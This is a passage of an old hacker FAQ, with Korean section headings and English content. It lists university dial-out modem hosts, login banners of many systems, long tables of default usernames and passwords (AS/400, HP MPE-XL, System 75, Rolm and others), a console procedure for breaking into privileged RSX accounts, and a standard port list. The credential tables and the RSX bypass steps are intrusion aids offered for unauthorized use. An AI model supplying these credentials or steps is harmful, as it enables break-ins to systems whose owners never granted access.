+615     dca.utk.edu                     "dial2400"
+617     dialout.lcs.mit.edu
+619     dialin.ucsd.edu                 "dialout"
+        128.54.30.1                     nue
+713     128.143.70.101                  "connect hayes"
+        128.249.27.154                  c modem96
+                                        atdt 9xxx-xxxx
+        128.249.27.153                  " -+ as above +- "
+        modem24.bcm.tmc.edu
+        modem12.bcm.tmc.edu
+714     130.191.4.70                    atdt 8xxx-xxxx
+804     ublan.acc.virginia.edu          c hayes
+        128.143.70.101                  connect hayes
+                                        atdt xxx-xxxx
+902     star.ccs.tuns.ca                "dialout"          [down...]
+916     128.120.2.251                   "dialout"          [down...]
+        129.137.33.72                                      [can't connect]
+???     dialout1.princeton.edu                             [can't connect]
+        dswitch.byu.edu                 "C Modem"          [can't connect]
+        modem.cis.uflu.edu                                 [can't connect]
+        r596adi1.uc.edu                                    [can't connect]
+        vtnet1.cns.ut.edu               "CALL" or "call"   [can't connect]
+        18.26.0.55                                         [can't connect]
+        128.173.5.4                                        [need password!]
+        128.187.1.2                                        [need password!]
+        129.137.33.71                                      [can't connect]
+        bstorm.bga.com / port=4000                         [what is this?]
+
+20.이 시스템은 어떤것들인가?
+다음은 각 시스템들의 로그인 화면이다.
+AIX
+~~~
+IBM AIX Version 3 for RISC System/6000
+(C) Copyrights by IBM and by others 1982, 1990.
+login:
+
+[You will know an AIX system because it is the only Unix system that]
+[clears the screen and issues a login prompt near the bottom of the]
+[screen]
+
+
+AS/400
+~~~~~~
+UserID?
+Password?
+
+Once in, type GO MAIN
+
+
+CDC Cyber
+~~~~~~~~~
+WELCOME TO THE NOS SOFTWARE SYSTEM.
+COPYRIGHT CONTROL DATA 1978, 1987.
+
+88/02/16. 02.36.53. N265100
+CSUS CYBER 170-730.                     NOS 2.5.2-678/3.
+FAMILY:
+
+You would normally just hit return at the family prompt.  Next prompt is:
+
+USER NAME:
+
+
+CISCO Router
+~~~~~~~~~~~~
+                             FIRST BANK OF TNO
+                           95-866 TNO VirtualBank
+                          REMOTE Router -  TN043R1
+
+                                Console Port
+
+                                SN - 00000866
+
+TN043R1>
+
+
+DECserver
+~~~~~~~~~
+DECserver 700-08 Communications Server V1.1 (BL44G-11A) - LAT V5.1
+DPS502-DS700
+
+(c) Copyright 1992, Digital Equipment Corporation - All Rights Reserved
+
+Please type HELP if you need assistance
+
+Enter username> TNO
+
+Local>
+
+
+Hewlett Packard MPE-XL
+~~~~~~~~~~~~~~~~~~~~~~
+MPE XL:
+EXPECTED A :HELLO COMMAND. (CIERR 6057)
+MPE XL:
+EXPECTED [SESSION NAME,] USER.ACCT [,GROUP]   (CIERR 1424)
+MPE XL:
+
+
+GTN
+~~~
+WELCOME TO CITIBANK. PLEASE SIGN ON.
+XXXXXXXX
+
+@
+PASSWORD =
+
+@
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+PLEASE ENTER YOUR ID:-1->
+PLEASE ENTER YOUR PASSWORD:-2->
+
+CITICORP (CITY NAME). KEY GHELP FOR HELP.
+  XXX.XXX
+ PLEASE SELECT SERVICE REQUIRED.-3->
+
+
+Lantronix Terminal Server
+~~~~~~~~~~~~~~~~~~~~~~~~~
+Lantronix ETS16 Version V3.1/1(940623)
+
+Type HELP at the 'Local_15> ' prompt for assistance.
+
+Login password>
+
+
+Meridian Mail (Northern Telecom Phone/Voice Mail System)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                            MMM       MM MERIDIAN
+                           MMMMM     MMMMM
+                         MMMMMM   MMMMMM
+                        MMM  MMMMM  MMM     MMMMM     MMMMM
+                      MMM   MMM   MMM     MMMMMM   MMMMMM
+                     MMM         MMM     MMM MMM MMM MMM
+                    MMM         MMM     MMM  MMMMM  MMM
+                   MMM         MMM     MMM   MMM   MMM
+                  MMM         MMM     MMM         MMM
+                 MMM         MMM     MMM         MMM
+                MMM         MMM     MMM         MMM
+               MMM         MMM     MMM         MMM
+              MMM         MMM     MMM         MMM
+
+                                          Copyright (c) Northern Telecom, 1991
+
+
+Novell ONLAN
+~~~~~~~~~~~~
+ N
+
+[To access the systems it is best to own a copy of ONLAN/PC]
+
+
+PC-Anywhere
+~~~~~~~~~~~
+ P
+
+[To access the systems it is best to own a copy of PCAnywhere Remote]
+
+
+PRIMOS
+~~~~~~
+PRIMENET 19.2.7F PPOA1
+
+<any text>
+
+ER!
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+CONNECT
+Primenet V 2.3  (system)
+LOGIN           (you)
+User id?        (system)
+SAPB5           (you)
+Password?       (system)
+DROWSAP         (you)
+OK,             (system)
+
+
+ROLM-OSL
+~~~~~~~~
+MARAUDER10292  01/09/85(^G) 1 03/10/87  00:29:47
+RELEASE 8003
+OSL, PLEASE.
+?
+
+
+System75
+~~~~~~~~
+Login: root
+INCORRECT LOGIN
+
+Login: browse
+Password:
+
+Software Version: G3s.b16.2.2
+
+Terminal Type (513, 4410, 4425): [513]
+
+
+Tops-10
+~~~~~~~
+NIH Timesharing
+
+NIH Tri-SMP 7.02-FF  16:30:04 TTY11
+system 1378/1381/1453 Connected to Node Happy(40) Line # 12
+Please LOGIN
+.
+
+
+VM/370
+~~~~~~
+VM/370
+!
+
+
+VM/ESA
+~~~~~~
+VM/ESA ONLINE
+
+                                          TBVM2 VM/ESA Rel 1.1     PUT 9200
+
+Fill in your USERID and PASSWORD and press ENTER
+(Your password will not appear when you type it)
+USERID   ===>
+PASSWORD ===>
+
+COMMAND  ===>
+
+
+Xylogics Annex Communications Server
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Annex Command Line Interpreter   *   Copyright 1991 Xylogics, Inc.
+
+Checking authorization, Please wait...
+Annex username: TNO
+Annex password:
+
+Permission granted
+annex:
+
+21.각 시스템에 따른 어카운트는 무엇인가?
+AIX
+~~~
+guest           guest
+
+
+AS/400
+~~~~~~
+qsecofr         qsecofr         /* master security officer */
+qsysopr         qsysopr         /* system operator         */
+qpgmr           qpgmr           /* default programmer      */
+
+also
+
+ibm/password
+ibm/2222
+ibm/service
+qsecofr/1111111
+qsecofr/2222222
+qsvr/qsvr
+secofr/secofr
+
+
+DECserver
+~~~~~~~~~
+ACCESS
+SYSTEM
+
+
+Hewlett Packard MPE-XL
+~~~~~~~~~~~~~~~~~~~~~~
+HELLO           MANAGER.SYS
+HELLO           MGR.SYS
+HELLO           FIELD.SUPPORT     HPUNSUP or SUPPORT or HP
+HELLO           OP.OPERATOR
+MGR             CAROLIAN
+MGR             CCC
+MGR             CNAS
+MGR             CONV
+MGR             COGNOS
+OPERATOR        COGNOS
+MANAGER         COGNOS
+OPERATOR        DISC
+MGR             HPDESK
+MGR             HPWORD
+FIELD           HPWORD
+MGR             HPOFFICE
+SPOOLMAN        HPOFFICE
+ADVMAIL         HPOFFICE
+MAIL            HPOFFICE
+WP              HPOFFICE
+MANAGER         HPOFFICE
+MGR             HPONLY
+FIELD           HPP187
+MGR             HPP187
+MGR             HPP189
+MGR             HPP196
+MGR             INTX3
+MGR             ITF3000
+MANAGER         ITF3000
+MAIL            MAIL
+MGR             NETBASE
+MGR             REGO
+MGR             RJE
+MGR             ROBELLE
+MANAGER         SECURITY
+MGR             SECURITY
+FIELD           SERVICE
+MANAGER         SYS
+MGR             SYS
+PCUSER          SYS
+RSBCMON         SYS
+OPERATOR        SYS
+OPERATOR        SYSTEM
+FIELD           SUPPORT
+OPERATOR        SUPPORT
+MANAGER         TCH
+MAIL            TELESUP
+MANAGER         TELESUP
+MGR             TELESUP
+SYS             TELESUP
+MGE             VESOFT
+MGE             VESOFT
+MGR             WORD
+MGR             XLSERVER
+
+Common jobs are Pub, Sys, Data
+Common passwords are HPOnly, TeleSup, HP, MPE, Manager, MGR, Remote
+
+
+Major BBS
+~~~~~~~~~
+Sysop           Sysop
+
+
+PICK O/S
+~~~~~~~~
+DSA             # Desquetop System Administrator
+DS
+DESQUETOP
+PHANTOM
+
+
+Prolog
+~~~~~~
+PBX             PBX
+NETWORK         NETWORK
+NETOP           <null>
+
+
+Rolm
+~~~~
+CBX Defaults
+
+op              op
+op              operator
+su              super
+admin           pwp
+eng             engineer
+
+
+PhoneMail Defaults
+
+sysadmin        sysadmin
+tech            tech
+poll            tech
+
+
+RSX
+~~~
+SYSTEM/SYSTEM   (Username SYSTEM, Password SYSTEM)
+1,1/system      (Directory [1,1] Password SYSTEM)
+BATCH/BATCH
+SYSTEM/MANAGER
+USER/USER
+
+Default accounts for Micro/RSX:
+
+                MICRO/RSX
+
+Alternately you can hit <CTRL-Z>  when the boot sequence asks you for the
+date and create an account using:
+
+                RUN ACNT
+            or  RUN $ACNT
+
+(Numbers below 10 {oct} are Priveleged)
+
+Reboot and wait for the date/time question. Type ^C and at the MCR prompt,
+type "abo at." You must include the . dot!
+
+If this works, type "acs lb0:/blks=1000" to get some swap space so the
+new step won't wedge.
+
+type " run $acnt" and change the password of any account with a group
+number of 7 or less.
+
+You may find that the ^C does not work. Try ^Z and ESC as well.
+Also try all 3 as terminators to valid and invalid times.
+
+If none of the above work, use the halt switch to halt the system,
+just after a invalid date-time.  Look for a user mode PSW 1[4-7]xxxx.
+then deposit 177777 into R6, cross your fingers, write protect the drive
+and continue the system.  This will hopefully result in indirect blowing
+up...  And hopefully the system has not been fully secured.
+
+
+System 75
+~~~~~~~~~
+bcim            bcimpw
+bciim           bciimpw
+bcms            bcmspw, bcms
+bcnas           bcnspw
+blue            bluepw
+browse          looker, browsepw
+craft           crftpw, craftpw, crack
+cust            custpw
+enquiry         enquirypw
+field           support
+inads           indspw, inadspw, inads
+init            initpw
+kraft           kraftpw
+locate          locatepw
+maint           maintpw, rwmaint
+nms             nmspw
+rcust           rcustpw
+support         supportpw
+tech            field
+
+
+Taco Bell
+~~~~~~~~~
+rgm             rollout
+tacobell        <null>
+
+
+Verifone Junior 2.05
+~~~~~~~~~~~~~~~~~~~~
+Default password: 166816
+
+
+VMS
+~~~
+field           service
+systest         utep
+
+22.각 포트에서 행해지는 작업은 무엇인가?
+유닉스상의 /etc/services 파일은 각 port에서 일어나는 일들이 기록되어 있다.
+다음은 실제로 존재하는 가장 완벽한 port목록이다.
+
+Keyword         Decimal    Description
+-------         -------    -----------
+                  0/tcp    Reserved
+                  0/udp    Reserved
+tcpmux            1/tcp    TCP Port Service Multiplexer
+tcpmux            1/udp    TCP Port Service Multiplexer
+compressnet       2/tcp    Management Utility
+compressnet       2/udp    Management Utility
+compressnet       3/tcp    Compression Process
+compressnet       3/udp    Compression Process
+                  4/tcp    Unassigned
+                  4/udp    Unassigned
+rje               5/tcp    Remote Job Entry
+rje               5/udp    Remote Job Entry
+                  6/tcp    Unassigned
+                  6/udp    Unassigned
+echo              7/tcp    Echo
+echo              7/udp    Echo
+                  8/tcp    Unassigned
+                  8/udp    Unassigned
+discard           9/tcp    Discard
+discard           9/udp    Discard
+                 10/tcp    Unassigned
+                 10/udp    Unassigned
+systat           11/tcp    Active Users
+systat           11/udp    Active Users
+                 12/tcp    Unassigned
+                 12/udp    Unassigned
+daytime          13/tcp    Daytime
+daytime          13/udp    Daytime
+                 14/tcp    Unassigned
+                 14/udp    Unassigned
+                 15/tcp    Unassigned [was netstat]
+                 15/udp    Unassigned
+                 16/tcp    Unassigned
+                 16/udp    Unassigned
+qotd             17/tcp    Quote of the Day
+qotd             17/udp    Quote of the Day
+msp              18/tcp    Message Send Protocol
+msp              18/udp    Message Send Protocol
+chargen          19/tcp    Character Generator
+chargen          19/udp    Character Generator
+ftp-data         20/tcp    File Transfer [Default Data]
+ftp-data         20/udp    File Transfer [Default Data]
+ftp              21/tcp    File Transfer [Control]
+ftp              21/udp    File Transfer [Control]
+                 22/tcp    Unassigned
+                 22/udp    Unassigned
+telnet           23/tcp    Telnet
+telnet           23/udp    Telnet
+                 24/tcp    any private mail system
+                 24/udp    any private mail system
+smtp             25/tcp    Simple Mail Transfer
+smtp             25/udp    Simple Mail Transfer
+                 26/tcp    Unassigned
+                 26/udp    Unassigned
+nsw-fe           27/tcp    NSW User System FE
+nsw-fe           27/udp    NSW User System FE
+                 28/tcp    Unassigned
+                 28/udp    Unassigned
+msg-icp          29/tcp    MSG ICP
+msg-icp          29/udp    MSG ICP
+                 30/tcp    Unassigned
+                 30/udp    Unassigned
+msg-auth         31/tcp    MSG Authentication
+msg-auth         31/udp    MSG Authentication
+                 32/tcp    Unassigned
+                 32/udp    Unassigned
+dsp              33/tcp    Display Support Protocol
+dsp              33/udp    Display Support Protocol
+                 34/tcp    Unassigned
+                 34/udp    Unassigned
+                 35/tcp    any private printer server
+                 35/udp    any private printer server
+                 36/tcp    Unassigned
+                 36/udp    Unassigned
+time             37/tcp    Time
+time             37/udp    Time
+                 38/tcp    Unassigned
+                 38/udp    Unassigned
+rlp              39/tcp    Resource Location Protocol
+rlp              39/udp    Resource Location Protocol
+                 40/tcp    Unassigned
+                 40/udp    Unassigned
+graphics         41/tcp    Graphics
+graphics         41/udp    Graphics
+nameserver       42/tcp    Host Name Server
+nameserver       42/udp    Host Name Server
+nicname          43/tcp    Who Is
+nicname          43/udp    Who Is
+mpm-flags        44/tcp    MPM FLAGS Protocol
+mpm-flags        44/udp    MPM FLAGS Protocol
+mpm              45/tcp    Message Processing Module [recv]
+mpm              45/udp    Message Processing Module [recv]
+mpm-snd          46/tcp    MPM [default send]
+mpm-snd          46/udp    MPM [default send]
+ni-ftp           47/tcp    NI FTP
+ni-ftp           47/udp    NI FTP
+                 48/tcp    Unassigned
+                 48/udp    Unassigned
+login            49/tcp    Login Host Protocol
+login            49/udp    Login Host Protocol
+re-mail-ck       50/tcp    Remote Mail Checking Protocol
+re-mail-ck       50/udp    Remote Mail Checking Protocol
+la-maint         51/tcp    IMP Logical Address Maintenance
+la-maint         51/udp    IMP Logical Address Maintenance
+xns-time         52/tcp    XNS Time Protocol
+xns-time         52/udp    XNS Time Protocol
+domain           53/tcp    Domain Name Server
+domain           53/udp    Domain Name Server
+xns-ch           54/tcp    XNS Clearinghouse
+xns-ch           54/udp    XNS Clearinghouse
+isi-gl           55/tcp    ISI Graphics Language
+isi-gl           55/udp    ISI Graphics Language
+xns-auth         56/tcp    XNS Authentication
+xns-auth         56/udp    XNS Authentication
+                 57/tcp    any private terminal access
+                 57/udp    any private terminal access
+xns-mail         58/tcp    XNS Mail
+xns-mail         58/udp    XNS Mail
+                 59/tcp    any private file service
+                 59/udp    any private file service
+                 60/tcp    Unassigned
+                 60/udp    Unassigned
+ni-mail          61/tcp    NI MAIL
+ni-mail          61/udp    NI MAIL
+acas             62/tcp    ACA Services
+acas             62/udp    ACA Services
+via-ftp          63/tcp    VIA Systems - FTP
+via-ftp          63/udp    VIA Systems - FTP
+covia            64/tcp    Communications Integrator (CI)
+covia            64/udp    Communications Integrator (CI)
+tacacs-ds        65/tcp    TACACS-Database Service
+tacacs-ds        65/udp    TACACS-Database Service
+sql*net          66/tcp    Oracle SQL*NET
+sql*net          66/udp    Oracle SQL*NET
+bootps           67/tcp    Bootstrap Protocol Server
+bootps           67/udp    Bootstrap Protocol Server
+bootpc           68/tcp    Bootstrap Protocol Client
+bootpc           68/udp    Bootstrap Protocol Client
+tftp             69/tcp    Trivial File Transfer
+tftp             69/udp    Trivial File Transfer
+gopher           70/tcp    Gopher
+gopher           70/udp    Gopher
+netrjs-1         71/tcp    Remote Job Service
+netrjs-1         71/udp    Remote Job Service
+netrjs-2         72/tcp    Remote Job Service
+netrjs-2         72/udp    Remote Job Service
+netrjs-3         73/tcp    Remote Job Service
+netrjs-3         73/udp    Remote Job Service
+netrjs-4         74/tcp    Remote Job Service
+netrjs-4         74/udp    Remote Job Service
+                 75/tcp    any private dial out service
+                 75/udp    any private dial out service
+                 76/tcp    Unassigned
+                 76/udp    Unassigned
+                 77/tcp    any private RJE service
+                 77/udp    any private RJE service
+vettcp           78/tcp    vettcp
+vettcp           78/udp    vettcp
+finger           79/tcp    Finger
+finger           79/udp    Finger
+www              80/tcp    World Wide Web HTTP
+www              80/udp    World Wide Web HTTP
+hosts2-ns        81/tcp    HOSTS2 Name Server
+hosts2-ns        81/udp    HOSTS2 Name Server
+xfer             82/tcp    XFER Utility
+xfer             82/udp    XFER Utility
+mit-ml-dev       83/tcp    MIT ML Device
+mit-ml-dev       83/udp    MIT ML Device
+ctf              84/tcp    Common Trace Facility
+ctf              84/udp    Common Trace Facility
+mit-ml-dev       85/tcp    MIT ML Device
+mit-ml-dev       85/udp    MIT ML Device
+mfcobol          86/tcp    Micro Focus Cobol
+mfcobol          86/udp    Micro Focus Cobol
+                 87/tcp    any private terminal link
+                 87/udp    any private terminal link
+kerberos         88/tcp    Kerberos
+kerberos         88/udp    Kerberos
+su-mit-tg        89/tcp    SU/MIT Telnet Gateway
+su-mit-tg        89/udp    SU/MIT Telnet Gateway
+dnsix            90/tcp    DNSIX Securit Attribute Token Map
+dnsix            90/udp    DNSIX Securit Attribute Token Map
+mit-dov          91/tcp    MIT Dover Spooler
+mit-dov          91/udp    MIT Dover Spooler
+npp              92/tcp    Network Printing Protocol
+npp              92/udp    Network Printing Protocol
+dcp              93/tcp    Device Control Protocol
+dcp              93/udp    Device Control Protocol
+objcall          94/tcp    Tivoli Object Dispatcher
+objcall          94/udp    Tivoli Object Dispatcher
+supdup           95/tcp    SUPDUP
+supdup           95/udp    SUPDUP
+dixie            96/tcp    DIXIE Protocol Specification
+dixie            96/udp    DIXIE Protocol Specification
+swift-rvf        97/tcp    Swift Remote Vitural File Protocol
+swift-rvf        97/udp    Swift Remote Vitural File Protocol
+tacnews          98/tcp    TAC News
+tacnews          98/udp    TAC News
+metagram         99/tcp    Metagram Relay
+metagram         99/udp    Metagram Relay
+newacct         100/tcp    [unauthorized use]
+hostname        101/tcp    NIC Host Name Server
+hostname        101/udp    NIC Host Name Server
+iso-tsap        102/tcp    ISO-TSAP
+iso-tsap        102/udp    ISO-TSAP
+gppitnp         103/tcp    Genesis Point-to-Point Trans Net
+gppitnp         103/udp    Genesis Point-to-Point Trans Net
+acr-nema        104/tcp    ACR-NEMA Digital Imag. & Comm. 300
+acr-nema        104/udp    ACR-NEMA Digital Imag. & Comm. 300
+csnet-ns        105/tcp    Mailbox Name Nameserver
+csnet-ns        105/udp    Mailbox Name Nameserver
+3com-tsmux      106/tcp    3COM-TSMUX
+3com-tsmux      106/udp    3COM-TSMUX
+rtelnet         107/tcp    Remote Telnet Service
+rtelnet         107/udp    Remote Telnet Service
+snagas          108/tcp    SNA Gateway Access Server
+snagas          108/udp    SNA Gateway Access Server
+pop2            109/tcp    Post Office Protocol - Version 2
+pop2            109/udp    Post Office Protocol - Version 2
+pop3            110/tcp    Post Office Protocol - Version 3
+pop3            110/udp    Post Office Protocol - Version 3
+sunrpc          111/tcp    SUN Remote Procedure Call
+sunrpc          111/udp    SUN Remote Procedure Call
+mcidas          112/tcp    McIDAS Data Transmission Protocol
+mcidas          112/udp    McIDAS Data Transmission Protocol
+auth            113/tcp    Authentication Service
+auth            113/udp    Authentication Service
+audionews       114/tcp    Audio News Multicast
+audionews       114/udp    Audio News Multicast
+sftp            115/tcp    Simple File Transfer Protocol
+sftp            115/udp    Simple File Transfer Protocol
+ansanotify      116/tcp    ANSA REX Notify
+ansanotify      116/udp    ANSA REX Notify
+uucp-path       117/tcp    UUCP Path Service
+uucp-path       117/udp    UUCP Path Service
+sqlserv         118/tcp    SQL Services
+sqlserv         118/udp    SQL Services
+nntp            119/tcp    Network News Transfer Protocol
+nntp            119/udp    Network News Transfer Protocol
+cfdptkt         120/tcp    CFDPTKT
+cfdptkt         120/udp    CFDPTKT
+erpc            121/tcp    Encore Expedited Remote Pro.Call
+erpc            121/udp    Encore Expedited Remote Pro.Call
+smakynet        122/tcp    SMAKYNET
+smakynet        122/udp    SMAKYNET
+ntp             123/tcp    Network Time Protocol
+ntp             123/udp    Network Time Protocol
+ansatrader      124/tcp    ANSA REX Trader
+ansatrader      124/udp    ANSA REX Trader
+locus-map       125/tcp    Locus PC-Interface Net Map Ser
+locus-map       125/udp    Locus PC-Interface Net Map Ser
+unitary         126/tcp    Unisys Unitary Login
+unitary         126/udp    Unisys Unitary Login
+locus-con       127/tcp    Locus PC-Interface Conn Server
+locus-con       127/udp    Locus PC-Interface Conn Server
+gss-xlicen      128/tcp    GSS X License Verification
+gss-xlicen      128/udp    GSS X License Verification
+pwdgen          129/tcp    Password Generator Protocol
+pwdgen          129/udp    Password Generator Protocol
+cisco-fna       130/tcp    cisco FNATIVE
+cisco-fna       130/udp    cisco FNATIVE
+cisco-tna       131/tcp    cisco TNATIVE
+cisco-tna       131/udp    cisco TNATIVE
+cisco-sys       132/tcp    cisco SYSMAINT
+cisco-sys       132/udp    cisco SYSMAINT
+statsrv         133/tcp    Statistics Service
+statsrv         133/udp    Statistics Service
+ingres-net      134/tcp    INGRES-NET Service
+ingres-net      134/udp    INGRES-NET Service
+loc-srv         135/tcp    Location Service
+loc-srv         135/udp    Location Service
+profile         136/tcp    PROFILE Naming System
+profile         136/udp    PROFILE Naming System
+netbios-ns      137/tcp    NETBIOS Name Service
+netbios-ns      137/udp    NETBIOS Name Service
+netbios-dgm     138/tcp    NETBIOS Datagram Service
+netbios-dgm     138/udp    NETBIOS Datagram Service
+netbios-ssn     139/tcp    NETBIOS Session Service
+netbios-ssn     139/udp    NETBIOS Session Service
+emfis-data      140/tcp    EMFIS Data Service
+emfis-data      140/udp    EMFIS Data Service
+emfis-cntl      141/tcp    EMFIS Control Service
+emfis-cntl      141/udp    EMFIS Control Service
+bl-idm          142/tcp    Britton-Lee IDM
+bl-idm          142/udp    Britton-Lee IDM
+imap2           143/tcp    Interim Mail Access Protocol v2
+imap2           143/udp    Interim Mail Access Protocol v2
+news            144/tcp    NewS
+news            144/udp    NewS
+uaac            145/tcp    UAAC Protocol
+uaac            145/udp    UAAC Protocol
+iso-tp0         146/tcp    ISO-IP0
+iso-tp0         146/udp    ISO-IP0
+iso-ip          147/tcp    ISO-IP
+iso-ip          147/udp    ISO-IP
+cronus          148/tcp    CRONUS-SUPPORT
+cronus          148/udp    CRONUS-SUPPORT
+aed-512         149/tcp    AED 512 Emulation Service
+aed-512         149/udp    AED 512 Emulation Service
+sql-net         150/tcp    SQL-NET
+sql-net         150/udp    SQL-NET
+hems            151/tcp    HEMS
+hems            151/udp    HEMS
+bftp            152/tcp    Background File Transfer Program
+bftp            152/udp    Background File Transfer Program
+sgmp            153/tcp    SGMP
+sgmp            153/udp    SGMP
+netsc-prod      154/tcp    NETSC
+netsc-prod      154/udp    NETSC
+netsc-dev       155/tcp    NETSC
+netsc-dev       155/udp    NETSC
+sqlsrv          156/tcp    SQL Service
+sqlsrv          156/udp    SQL Service
+knet-cmp        157/tcp    KNET/VM Command/Message Protocol
+knet-cmp        157/udp    KNET/VM Command/Message Protocol
+pcmail-srv      158/tcp    PCMail Server
+pcmail-srv      158/udp    PCMail Server
+nss-routing     159/tcp   NSS-Routing
+nss-routing     159/udp   NSS-Routing
+sgmp-traps      160/tcp    SGMP-TRAPS
+sgmp-traps      160/udp    SGMP-TRAPS
+snmp            161/tcp    SNMP
+snmp            161/udp    SNMP
+snmptrap        162/tcp    SNMPTRAP
+snmptrap        162/udp    SNMPTRAP
+cmip-man        163/tcp    CMIP/TCP Manager
+cmip-man        163/udp    CMIP/TCP Manager
+cmip-agent      164/tcp    CMIP/TCP Agent
+smip-agent      164/udp    CMIP/TCP Agent
+xns-courier     165/tcp   Xerox
+xns-courier     165/udp   Xerox
+s-net           166/tcp    Sirius Systems
+s-net           166/udp    Sirius Systems
+namp            167/tcp    NAMP
+namp            167/udp    NAMP
+rsvd            168/tcp    RSVD
+rsvd            168/udp    RSVD
+send            169/tcp    SEND
+send            169/udp    SEND
+print-srv       170/tcp    Network PostScript
+print-srv       170/udp    Network PostScript
+multiplex       171/tcp    Network Innovations Multiplex
+multiplex       171/udp    Network Innovations Multiplex
+cl/1            172/tcp    Network Innovations CL/1
+cl/1            172/udp    Network Innovations CL/1
+xyplex-mux      173/tcp    Xyplex
+xyplex-mux      173/udp    Xyplex
+mailq           174/tcp    MAILQ
+mailq           174/udp    MAILQ
+vmnet           175/tcp    VMNET
+vmnet           175/udp    VMNET
+genrad-mux      176/tcp    GENRAD-MUX
+genrad-mux      176/udp    GENRAD-MUX
+xdmcp           177/tcp    X Display Manager Control Protocol
+xdmcp           177/udp    X Display Manager Control Protocol
+nextstep        178/tcp    NextStep Window Server
+NextStep        178/udp    NextStep Window Server
+bgp             179/tcp    Border Gateway Protocol
+bgp             179/udp    Border Gateway Protocol
+ris             180/tcp    Intergraph
+ris             180/udp    Intergraph
+unify           181/tcp    Unify
+unify           181/udp    Unify
+audit           182/tcp    Unisys Audit SITP
+audit           182/udp    Unisys Audit SITP
+ocbinder        183/tcp    OCBinder
+ocbinder        183/udp    OCBinder
+ocserver        184/tcp    OCServer
+ocserver        184/udp    OCServer
+remote-kis      185/tcp    Remote-KIS
+remote-kis      185/udp    Remote-KIS
+kis             186/tcp    KIS Protocol
+kis             186/udp    KIS Protocol
+aci             187/tcp    Application Communication Interface
+aci             187/udp    Application Communication Interface
+mumps           188/tcp    Plus Five's MUMPS
+mumps           188/udp    Plus Five's MUMPS
+qft             189/tcp    Queued File Transport
+qft             189/udp    Queued File Transport
+gacp            190/tcp    Gateway Access Control Protocol
+cacp            190/udp    Gateway Access Control Protocol
+prospero        191/tcp    Prospero
+prospero        191/udp    Prospero
+osu-nms         192/tcp    OSU Network Monitoring System
+osu-nms         192/udp    OSU Network Monitoring System
+srmp            193/tcp    Spider Remote Monitoring Protocol
+srmp            193/udp    Spider Remote Monitoring Protocol
+irc             194/tcp    Internet Relay Chat Protocol
+irc             194/udp    Internet Relay Chat Protocol
+dn6-nlm-aud     195/tcp    DNSIX Network Level Module Audit
+dn6-nlm-aud     195/udp    DNSIX Network Level Module Audit
+dn6-smm-red     196/tcp    DNSIX Session Mgt Module Audit Redir
+dn6-smm-red     196/udp    DNSIX Session Mgt Module Audit Redir
+dls             197/tcp    Directory Location Service
+dls             197/udp    Directory Location Service
+dls-mon         198/tcp    Directory Location Service Monitor
+dls-mon         198/udp    Directory Location Service Monitor
+smux            199/tcp    SMUX
+smux            199/udp    SMUX
+src             200/tcp    IBM System Resource Controller
+src             200/udp    IBM System Resource Controller
+at-rtmp         201/tcp    AppleTalk Routing Maintenance
+at-rtmp         201/udp    AppleTalk Routing Maintenance
+at-nbp          202/tcp    AppleTalk Name Binding
+at-nbp          202/udp    AppleTalk Name Binding
+at-3            203/tcp    AppleTalk Unused
+at-3            203/udp    AppleTalk Unused
+at-echo         204/tcp    AppleTalk Echo
+at-echo         204/udp    AppleTalk Echo
+at-5            205/tcp    AppleTalk Unused
+at-5            205/udp    AppleTalk Unused
+at-zis          206/tcp    AppleTalk Zone Information
+at-zis          206/udp    AppleTalk Zone Information
+at-7            207/tcp    AppleTalk Unused
+at-7            207/udp    AppleTalk Unused
+at-8            208/tcp    AppleTalk Unused
+at-8            208/udp    AppleTalk Unused
+tam             209/tcp    Trivial Authenticated Mail Protocol
+tam             209/udp    Trivial Authenticated Mail Protocol
+z39.50          210/tcp    ANSI Z39.50
+z39.50          210/udp    ANSI Z39.50
+914c/g          211/tcp    Texas Instruments 914C/G Terminal
+914c/g          211/udp    Texas Instruments 914C/G Terminal
+anet            212/tcp    ATEXSSTR
+anet            212/udp    ATEXSSTR
+ipx             213/tcp    IPX
+ipx             213/udp    IPX
+vmpwscs         214/tcp    VM PWSCS
+vmpwscs         214/udp    VM PWSCS
+softpc          215/tcp    Insignia Solutions
+softpc          215/udp    Insignia Solutions
+atls            216/tcp    Access Technology License Server
+atls            216/udp    Access Technology License Server
+dbase           217/tcp    dBASE Unix
+dbase           217/udp    dBASE Unix
+mpp             218/tcp    Netix Message Posting Protocol
+mpp             218/udp    Netix Message Posting Protocol
+uarps           219/tcp    Unisys ARPs
+uarps           219/udp    Unisys ARPs
+imap3           220/tcp    Interactive Mail Access Protocol v3
+imap3           220/udp    Interactive Mail Access Protocol v3
+fln-spx         221/tcp    Berkeley rlogind with SPX auth
+fln-spx         221/udp    Berkeley rlogind with SPX auth
+fsh-spx         222/tcp    Berkeley rshd with SPX auth
+fsh-spx         222/udp    Berkeley rshd with SPX auth
+cdc             223/tcp    Certificate Distribution Center
+cdc             223/udp    Certificate Distribution Center
+                224-241    Reserved
+sur-meas        243/tcp    Survey Measurement
+sur-meas        243/udp    Survey Measurement
+link            245/tcp    LINK
+link            245/udp    LINK
+dsp3270         246/tcp    Display Systems Protocol
+dsp3270         246/udp    Display Systems Protocol
+                247-255    Reserved
+pawserv         345/tcp    Perf Analysis Workbench
+pawserv         345/udp    Perf Analysis Workbench
+zserv           346/tcp    Zebra server
+zserv           346/udp    Zebra server
+fatserv         347/tcp    Fatmen Server
+fatserv         347/udp    Fatmen Server
+clearcase       371/tcp    Clearcase
+clearcase       371/udp    Clearcase
+ulistserv       372/tcp    Unix Listserv
+ulistserv       372/udp    Unix Listserv
+legent-1        373/tcp    Legent Corporation
+legent-1        373/udp    Legent Corporation
+legent-2        374/tcp    Legent Corporation
+legent-2        374/udp    Legent Corporation
+exec            512/tcp    remote process execution;
+                           authentication performed using
+                           passwords and UNIX login names
+biff            512/udp    used by mail system to notify users
+                           of new mail received; currently
+                           receives messages only from
+                           processes on the same machine
+login           513/tcp    remote login a la telnet;
+                           automatic authentication performed
+                           based on priviledged port numbers
+                           and distributed data bases which
+                           identify "authentication domains"
+who             513/udp    maintains data bases showing who's
+                           logged in to machines on a local
+                           net and the load average of the
+                           machine
+cmd             514/tcp    like exec, but automatic
+                           authentication is performed as for
+                           login server
+syslog          514/udp
